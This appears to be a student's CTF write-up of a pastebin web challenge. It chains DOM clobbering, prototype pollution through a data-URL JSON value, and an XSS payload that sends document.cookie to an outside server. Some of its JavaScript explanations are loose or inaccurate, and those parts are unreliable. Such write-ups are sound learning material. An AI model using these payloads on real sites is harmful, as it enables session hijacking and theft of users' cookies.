
## Author: voxal

check out this pastebin! its a great way to store pieces of your sanity between ctfs.

---

**1. Challenge overview**

My motivation for this challenge was to learn more about DOM XSS and bypassing sanitization methods. This was my real CTF challenge ever, and it felt kind of exciting to boot up my own Docker container for the first time ever.

The site itself is simple. It has Paste-bin like functionality, letting you pass user data to the application and then your data is going through a sanitizer. 

There are a lot of concepts from ES10, which was released in 2019. 

**The code**

This is how the title element is being set:
```js 
const sanitizer = new Sanitizer();      document.getElementById("title").setHTML(decodeURIComponent(`title`), { sanitizer });
```

The [sanitizer object](https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer) is an object, which sanitizes the input in the .setHTML() method.

```js
class Debug {
	#sanitize;
	constructor(sanitize = true) {
			this.#sanitize = sanitize
        }
                
        get sanitize() {
            return this.#sanitize;
        }
    }
```

The debug class is declaring a private sanitize variable and a constructor, where the sanitize is being defaulted to true. Then it has a simple getter function, which returns the value of sanitize.

```js       
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
	        let res = await fetch(window.debug?.extension.toString());
	        extension = await res.json();
        }
```

The loadBody() function is an asynchronous function, which means it has to fulfill a promise when using the await keyword.

A promise is just a constructor, which takes two functions as arguments. The functions are resolve() and reject(). Resolving means the promise is successful and rejecting means it is not successful.

The ? operator in  `if (window.debug?.extension) {}`  here is checking if the class Debug exists and checking if extension true.

Then it continues to use the [fetch api](https://www.javascripttutorial.net/javascript-fetch-api/) , which is a modern version of the XMLHttpRequest, which works by fulfilling a promise and after returning the response. In above code it is doing a GET request, which fetches the value of debug.extension from the window. The await keyword is there, so it can wait until the request is fully completed.

Then it assigns the JSON value of the response to the variable extension. This is particularly interesting because you can actually send JSON values. More on this in the background section.

```js
const debug = Object.assign(new Debug(true), extension ?? { report: true });
let body = decodeURIComponent(`123abc`);
	if (debug.report) {
        const reportLink = document.createElement("a");
        reportLink.innerHTML = `Report ZZlREqPmH3J945xhNB0VF`;
        reportLink.href = `report/ZZlREqPmH3J945xhNB0VF`;
        reportLink.style.marginTop = "1rem";
        reportLink.style.display = "block"
        document.body.appendChild(reportLink)
    }
    if (debug.sanitize) {
	    document.getElementById("paste").setHTML(body, { sanitizer })
        } else {
	        document.getElementById("paste").innerHTML = body
		}
	}
            
	loadBody();
```

The debug variable is being assigned a Debug object with the properties of { sanitize: true } and an extension. If the extension is null or undefined, it goes and uses the default value of { report: true }

It's creating a report link if debug.report is true and assigning some properties to it.

If debug.sanitize is true: it is sanitizing malicious input with [.setHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML) method. This method is experimental, and is not supported by FireFox. At this point I had to switch to Chromium.

If debug.sanitize is false, it's getting the same HTML element and setting the body of that element to the body. If we could somehow manipulate the extension and get it to set the innerHTML to the body, it would go past the sanitizer.

**2. Challenge background**

First step was to understand how the code works in depth. Because there were many new concepts to me to understand, it took a little while to understand what vulnerabilities there could be.

I'm more familiar with DOM XSS, so I tried looking ways to manipulate the code execution flow by changing either the extension variable, which removes the report link generation or attack the source, which is the sanitize boolean.

After looking for ways to manipulate code execution from the internet, I stumbled against prototype pollution and DOM Clobbering a little later. These were still relatively new concepts to me, so the challenge took a little while.

*What is [DOM Clobbering](https://medium.com/@shilpybanerjee/dom-clobbering-its-clobbering-time-f8dd5c8fbc4b)?*

DOM Clobbering is a viable technique, when the website is reflecting user inputted HTML. If the sanitizer doesn't sanitize id and name attributes, it might be possible to control some HTML in the DOM.

For example, you might have an object like `someObject`.
Then it might call out to a variable like `variable`.

To clobber these values, you can send HTML markup with an anchor tag containing an id.
Then you create another anchor tag with the same id, the variable name and a href. 
```html
<a id=someObject>
<a id=someObject name=variable href="http://attacker.com/malicious.js">
```

If these control the execution flow of JavaScript, it might be possible to end up in a completely different situation, enabling XSS or in this challenge, even Prototype Pollution.

Based on our earlier code review, we can try to clobber the Object debug.extension with an href containing data URLs. 

By clobbering the object we can execute this conditional statement:
```js       
async function loadBody() {
    let extension = null;
    if (window.debug?.extension) {
	        let res = await fetch(window.debug?.extension.toString());
	        extension = await res.json();
        }
```


*What is [prototype pollution](https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)?*

"Well, firstly it needs to be understood that everything in JavaScript is an object: functions, strings, arrays etc. JavaScript inheritance is based on prototypes. Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. 

For example, String.prototype has a built-in method toLowerCase(), which means all strings have the method toLowerCase() because it was inherited from the prototype.

You can even view the properties of an object by accessing objectname.\_\_proto\_\_ in most modern browsers or using the Object.getPrototypeOf(objectname).

The core concern with prototype pollution is that an attacker may attempt to manipulate an object's prototype. This can lead to unexpected behavior in the application, including overwriting properties or methods of objects that are used later in the codebase. This can result in security vulnerabilities, data corruption, or crashes."

If we can send arbitrary json data, we would be able to pollute the Object.prototype, which should enable us to overwrite { sanitize: true } to { sanitize: false }

**3. Steps taken**

1. Step (Clobbering)

To clobber the debug.extension, we have to set the title to the payload of:
```html
<a id=debug><a id=debug name=extension href='data:text/plain;,{ "report": false }'>
```

By inspecting the DOM, we can see that this was successful:
```html
<h1 id="title">
  <a id="debug"></a><a id="debug" name="extension" href="data:text/plain;,{ &quot;report&quot;: false }"></a>
</h1>
```

And to be extra sure: we send a `console.log(debug.extension)` command to the developer console and we can see the exact same value:
```html
<a id="debug" name="extension" href="data:text/plain;,{ &quot;report&quot;: false }">
```

2. Step (Polluting)
Because we have control of the extension, we can send a \_\_proto\_\_ statement, to pollute the Object.prototype.

We just have to send it json like:
```json
{ "__proto__": { "sanitize": false }}
```

After testing, we notice that because the sanitize property is private, it cannot be modified this way. Private variables aren't a part of the prototype chain. Basically it means, that it's not vulnerable to pollution.

But maybe we could send it just enough data to make the sanitize variable something else than true?

I'm not sure of the reason but it's doing something that causes the sanitize variable to be something else than true, thus making it past the sanitizer:
```json
{ "__proto__": {}}
```

At this point it is possible to send arbitrary tags and get XSS.

3. XSS!
First I'm testing if the XSS actually works by sending a payload, which makes a malformed image, which errors out and alert the cookie of the user
```html 
<img src=x onerror=alert(document.cookie)>
```

It works. The point of this challenge is to get the admin cookie, so I need to set up a web server. Then I'll send a query with the document.cookie in it.

Essentially I'm sending the same payload, but with a redirect to my server and sending the user cookie through a GET request.
```html
<img src=x onerror=document.location='http://webserver.com/?'+document.cookie;>
```

***Flag: amateursCTF{s@nit1zer_ap1_pr3tty_go0d_but_not_p3rf3ct}***

**4. Lessons learned**

I learned two new techniques from this challenge: Prototype Pollution and DOM Clobbering. At first I just wanted to hone my skills on DOM XSS but I realized the fact that vulnerabilities are usually chained in some way.

On top of that, I learned new concepts from JavaScript and ES10, like ? and ?? operators, setHTML and sanitizer, private variables and how to read and understand JavaScript better. I even learnt more about asynchronous functions and promises.

An amazing challenge to learn and I'm glad I found this right now.

**5. Additional resources**

Javascript promise:
https://www.programiz.com/javascript/promise

Async and await in JavaScript:
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/await
https://www.programiz.com/javascript/async-await

Sanitizer object:
https://developer.mozilla.org/en-US/docs/Web/API/Sanitizer/Sanitizer
https://blog.logrocket.com/what-you-need-know-inbuilt-browser-html-sanitization/

setHTML method:
https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML

